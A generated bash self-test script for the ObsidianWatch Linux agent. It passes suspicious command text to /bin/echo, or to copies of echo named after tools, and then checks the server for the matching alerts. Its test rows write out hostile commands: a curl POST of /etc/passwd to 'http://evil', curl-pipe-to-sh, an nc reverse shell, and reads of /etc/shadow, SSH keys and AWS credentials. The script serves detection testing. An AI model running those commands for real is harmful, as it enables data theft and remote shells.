#!/usr/bin/env bash
# ObsidianWatch Linux alert self-test. GENERATED FILE - do not edit by hand.
# Regenerate: OW_UPDATE_SIM=1 go test ./internal/api -run TestSimScriptsUpToDate
#
# Runs harmless look-alikes of attacker behaviour on THIS machine: it only runs
# /bin/echo with the suspicious command text as arguments. Nothing is exploited,
# downloaded or executed. It then asks your management server whether each
# expected alert appeared and prints PASS/FAIL per rule.
#
# Use a test machine: it creates real alerts (and may email or webhook them).
# Every test carries the marker OWSIM-<nonce> so the alerts are easy to find.
# The ObsidianWatch agent must be running on this machine.
#
# Usage:
#   ./ow-simulate-*.sh --api https://obsidianwatch.example.com [--user admin] [--insecure]
#                      [--host NAME] [--wait 180] [--only ID,ID] [--no-verify] [--list] [--yes]
#   Set OW_TOKEN to skip the login prompt; OW_PASSWORD for non-interactive use.

API=""; USER_NAME="admin"; HOST_NAME="$(hostname -s 2>/dev/null || hostname)"; WAIT=180
ONLY=""; INSECURE=""; NOVERIFY=0; LIST=0; YES=0; TOKEN="${OW_TOKEN:-}"
while [ $# -gt 0 ]; do
  case "$1" in
    --api) API="$2"; shift 2;;
    --user) USER_NAME="$2"; shift 2;;
    --host) HOST_NAME="$2"; shift 2;;
    --wait) WAIT="$2"; shift 2;;
    --only) ONLY="$2"; shift 2;;
    --insecure) INSECURE="-k"; shift;;
    --no-verify) NOVERIFY=1; shift;;
    --list) LIST=1; shift;;
    --yes) YES=1; shift;;
    -h|--help) sed -n '2,18p' "$0"; exit 0;;
    *) echo "unknown option: $1" >&2; exit 2;;
  esac
done

IDS=(); TITLES=(); NEEDLES=(); CMDS=(); KINDS=(); NAMES=(); SKIPPED=()
selected() { [ -z "$ONLY" ] && return 0; case ",$ONLY," in *",$1,"*) return 0;; esac; return 1; }
# T id title json-title word...   (a runnable test)
T() { local id="$1" title="$2" needle="$3"; shift 3
  selected "$id" || return 0
  IDS+=("$id"); TITLES+=("$title"); NEEDLES+=("$needle"); KINDS+=("echo"); NAMES+=("")
  CMDS+=("$(printf '%s\037' "$@")")
}
# N id title json-title name word...  (a stand-in: a copy of /bin/echo named like the tool, run with its arguments)
N() { local id="$1" title="$2" needle="$3" name="$4"; shift 4
  selected "$id" || return 0
  IDS+=("$id"); TITLES+=("$title"); NEEDLES+=("$needle"); KINDS+=("named"); NAMES+=("$name")
  CMDS+=("$(printf '%s\037' "$@")")
}
# S "id: reason"                  (a rule that cannot be simulated safely)
S() { SKIPPED+=("$1"); }

# ---- generated tests ----
N 'L-ACCT-001' '[T1136.001] Local Account or Group Modified via CLI' '"[T1136.001] Local Account or Group Modified via CLI"' 'useradd' 'bob'
N 'L-ACCT-002' '[T1098] User Added to Privileged Group' '"[T1098] User Added to Privileged Group"' 'usermod' '-aG' 'sudo' 'bob'
N 'L-DLP-010' '[T1005] Database Dump Command' '"[T1005] Database Dump Command"' 'mysqldump' 'db'
T 'L-T1003.008' '[T1003.008] /etc/shadow Read' '"[T1003.008] /etc/shadow Read"' 'cat' '/etc/shadow'
N 'L-T1021.004' '[T1021.004] SSH Tunnel / Port Forward' '"[T1021.004] SSH Tunnel / Port Forward"' 'ssh' '-R' '8080:localhost:80' 'jump'
T 'L-T1046' '[T1046] Network Scanning Tool' '"[T1046] Network Scanning Tool"' 'nmap' '-sS' '10.0.0.0/24'
N 'L-T1048' '[T1048] curl POST Data Exfiltration' '"[T1048] curl POST Data Exfiltration"' 'curl' '-X' 'POST' '-d' '@/etc/passwd' 'http://evil'
N 'L-T1059.004a' '[T1059.004] Shell Suspicious Execution' '"[T1059.004] Shell Suspicious Execution"' 'bash' '-c' 'curl' 'http://x/a.sh' '|' 'sh'
T 'L-T1059.004b' '[T1059.004] Executable Run from /tmp or /dev/shm' '"[T1059.004] Executable Run from /tmp or /dev/shm"' '/tmp/payload'
N 'L-T1059.004c' '[T1059.004] Netcat Reverse Shell' '"[T1059.004] Netcat Reverse Shell"' 'nc' '-e' '/bin/sh' '10.0.0.5' '4444'
N 'L-T1059.006' '[T1059.006] Python/Perl/Ruby Reverse Shell' '"[T1059.006] Python/Perl/Ruby Reverse Shell"' 'python3' '-c' 'import' 'socket,subprocess;socket.socket()'
T 'L-T1070.002' '[T1070.002] Log File Deletion or History Wipe' '"[T1070.002] Log File Deletion or History Wipe"' 'history' '-c'
T 'L-T1078.004' '[T1078.004] Cloud Metadata Service Access' '"[T1078.004] Cloud Metadata Service Access"' 'curl' 'http://169.254.169.254/latest/meta-data/'
T 'L-T1087.001' '[T1087.001] Linux User Enumeration' '"[T1087.001] Linux User Enumeration"' 'cat' '/etc/passwd'
T 'L-T1090.003' '[T1090.003] Tor / Proxy Tool' '"[T1090.003] Tor / Proxy Tool"' 'proxychains' 'nmap' 'x'
N 'L-T1105' '[T1105] curl/wget Suspicious Download' '"[T1105] curl/wget Suspicious Download"' 'curl' '-o' '/tmp/x' 'http://evil/x'
T 'L-T1219' '[T1219] Remote Access Tool' '"[T1219] Remote Access Tool"' 'anydesk' '--start'
N 'L-T1222.002' '[T1222.002] World-Writable File (chmod 777)' '"[T1222.002] World-Writable File (chmod 777)"' 'chmod' '777' '/srv/x'
N 'L-T1547.006' '[T1547.006] Kernel Module Loaded' '"[T1547.006] Kernel Module Loaded"' 'insmod' 'rootkit.ko'
N 'L-T1548.001a' '[T1548.001] SUID Bit Set (chmod +s)' '"[T1548.001] SUID Bit Set (chmod +s)"' 'chmod' 'u+s' '/tmp/x'
N 'L-T1548.001b' '[T1548.001] Sudo Root Shell' '"[T1548.001] Sudo Root Shell"' 'sudo' 'su'
T 'L-T1552.004' '[T1552.004] SSH Private Key Access' '"[T1552.004] SSH Private Key Access"' 'cat' '/home/a/.ssh/id_rsa'
T 'L-T1552.005' '[T1552.005] Cloud Credential File Access' '"[T1552.005] Cloud Credential File Access"' 'cat' '/home/a/.aws/credentials'
N 'L-T1560' '[T1560.001] Archive of Sensitive Directory' '"[T1560.001] Archive of Sensitive Directory"' 'tar' 'czf' '/tmp/h.tgz' '/home/a'
T 'L-T1567' '[T1567.001] Paste/File Sharing Service Contact' '"[T1567.001] Paste/File Sharing Service Contact"' 'curl' 'https://transfer.sh/x'
T 'L-T1574.006' '[T1574.006] LD_PRELOAD Hijacking' '"[T1574.006] LD_PRELOAD Hijacking"' 'LD_PRELOAD=/tmp/x.so' 'ls'
N 'L-T1590' '[T1590] DNS/Domain Reconnaissance' '"[T1590] DNS/Domain Reconnaissance"' 'dig' 'example.com'
T 'L-T1592' '[T1592] Packet Capture Tool' '"[T1592] Packet Capture Tool"' 'tcpdump' '-i' 'eth0'
T 'L-T1611' '[T1611] Container Escape Indicator' '"[T1611] Container Escape Indicator"' 'nsenter' '--target' '1' '--mount'
S 'L-CTR-001: needs a real container event (log, file or system change)'
S 'L-SW-001: needs a real software event (log, file or system change)'
S 'L-T1053.003: needs a real file event (log, file or system change)'
S 'L-T1110.001: needs a real logon event (log, file or system change)'
S 'L-T1543.002: needs a real file event (log, file or system change)'
S 'L-T1546.004: needs a real file event (log, file or system change)'
S 'L-T1572: needs a real dns event (log, file or system change)'
S 'L-USB-001: needs a real usb event (log, file or system change)'
# ---- end of generated tests ----

if [ "$LIST" = 1 ]; then
  echo "${#IDS[@]} runnable tests:"
  for i in "${!IDS[@]}"; do printf '  %-14s %s\n' "${IDS[$i]}" "${TITLES[$i]}"; done
  echo; echo "${#SKIPPED[@]} rules cannot be simulated safely from a script:"
  for s in "${SKIPPED[@]}"; do echo "  $s"; done
  exit 0
fi

if [ "$NOVERIFY" = 0 ] && [ -z "$API" ]; then echo "Pass --api URL (or --no-verify to only run the actions)." >&2; exit 2; fi
if [ "$YES" = 0 ]; then
  printf "This will create about %s test alerts for host '%s'. Type YES to continue: " "${#IDS[@]}" "$HOST_NAME"
  read -r ans; [ "$ans" = "YES" ] || exit 0
fi

curl_api() { curl -s $INSECURE -H 'Content-Type: application/json' ${TOKEN:+-H "Authorization: Bearer $TOKEN"} "$@"; }
host_alerts() {
  local h
  for h in "$HOST_NAME" "$(printf '%s' "$HOST_NAME" | tr '[:lower:]' '[:upper:]')" "$(printf '%s' "$HOST_NAME" | tr '[:upper:]' '[:lower:]')"; do
    curl_api "$API/api/v1/alerts?host=$h" | grep -o '"id":[0-9]*,"created_at":"[^"]*","title":"[^"]*"'
  done | sort -u
}

BASE=0
if [ "$NOVERIFY" = 0 ]; then
  if [ -z "$TOKEN" ]; then
    PASS="${OW_PASSWORD:-}"
    if [ -z "$PASS" ]; then printf "Password for '%s': " "$USER_NAME"; stty -echo 2>/dev/null; read -r PASS; stty echo 2>/dev/null; echo; fi
    esc=$(printf '%s' "$PASS" | sed 's/\\/\\\\/g; s/"/\\"/g')
    TOKEN=$(curl_api -d "{\"username\":\"$USER_NAME\",\"password\":\"$esc\"}" "$API/auth/login" | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
    [ -n "$TOKEN" ] || { echo "Login failed." >&2; exit 2; }
  fi
  BASE=$(host_alerts | sed 's/^"id":\([0-9]*\),.*/\1/' | sort -n | tail -1); BASE=${BASE:-0}
fi

NONCE="$(LC_ALL=C tr -dc 'a-z0-9' </dev/urandom | head -c 8)"
SIMDIR="/var/tmp/owsim-$NONCE"; mkdir -p "$SIMDIR"; trap 'rm -rf "$SIMDIR"' EXIT
echo "Running ${#IDS[@]} tests (marker OWSIM-$NONCE)..."
for i in "${!IDS[@]}"; do
  IFS=$'\037' read -r -a W <<< "${CMDS[$i]}"
  if [ "${KINDS[$i]}" = named ]; then
    cp /bin/echo "$SIMDIR/${NAMES[$i]}" 2>/dev/null && "$SIMDIR/${NAMES[$i]}" "${W[@]}" "OWSIM-$NONCE" >/dev/null 2>&1
  else
    /bin/echo "OWSIM-$NONCE" "${W[@]}" >/dev/null 2>&1
  fi
  sleep 0.3
done
[ "$NOVERIFY" = 1 ] && { echo "Actions done; verification skipped."; exit 0; }

echo "Waiting up to ${WAIT}s for alerts (agent flush + detection cycle)..."
END=$(( $(date +%s) + WAIT )); FOUND=()
while :; do
  sleep 10
  NEW=$(host_alerts | awk -F'[:,]' -v b="$BASE" '$2+0 > b+0' )
  PENDING=0
  for i in "${!IDS[@]}"; do
    if echo "$NEW" | grep -qF "\"title\":${NEEDLES[$i]}"; then FOUND[$i]=1; else PENDING=$((PENDING+1)); fi
  done
  [ "$PENDING" = 0 ] && break
  [ "$(date +%s)" -ge "$END" ] && break
done

PASSN=0; FAILN=0; echo
for i in "${!IDS[@]}"; do
  if [ "${FOUND[$i]:-0}" = 1 ]; then printf 'PASS  %-14s %s\n' "${IDS[$i]}" "${TITLES[$i]}"; PASSN=$((PASSN+1))
  else printf 'FAIL  %-14s %s\n' "${IDS[$i]}" "${TITLES[$i]}"; FAILN=$((FAILN+1)); fi
done
echo; echo "$PASSN passed, $FAILN failed, ${#SKIPPED[@]} rules not simulable (run with --list)."
if [ "$FAILN" -gt 0 ]; then
  echo "A FAIL means the event never produced that alert. Check: agent running and connected; the rule is enabled and not in"
  echo "observe/allowlist mode; the host name matches --host; the alert was not suppressed."
fi
echo "Close the test alerts afterwards: search alerts for the marker OWSIM-$NONCE."
[ "$FAILN" -eq 0 ]
